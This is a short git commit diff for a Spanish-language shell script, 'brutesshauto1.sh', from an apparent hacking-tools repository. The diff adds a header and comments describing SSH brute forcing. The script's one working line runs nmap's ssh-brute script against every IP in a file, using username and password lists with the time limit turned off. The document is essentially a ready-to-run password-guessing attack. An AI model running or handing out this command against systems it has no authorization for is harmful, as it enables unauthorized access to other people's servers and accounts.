795ecf322401231a211220604d8494eb3566b0e0
hackingyseguridad <antonio_taboada@hotmail.es>
2022-10-10 15:43:09 +0200

    Update brutesshauto1.sh

--- brutesshauto1.sh
+++ brutesshauto1.sh
@@ -1,3 +1,4 @@
-
-
+#!/bin/bash
+# (c) Hacking y Seguridad .com 2022
+# Fuerza bruta SSH, de listado de IPs desde fichero ip.txt
 nmap -iL ip.txt -Pn $1 -p 22 --script ssh-brute --script-args userdb=usuarios.txt,passdb=claves.txt,unpwdb.timelimit=0
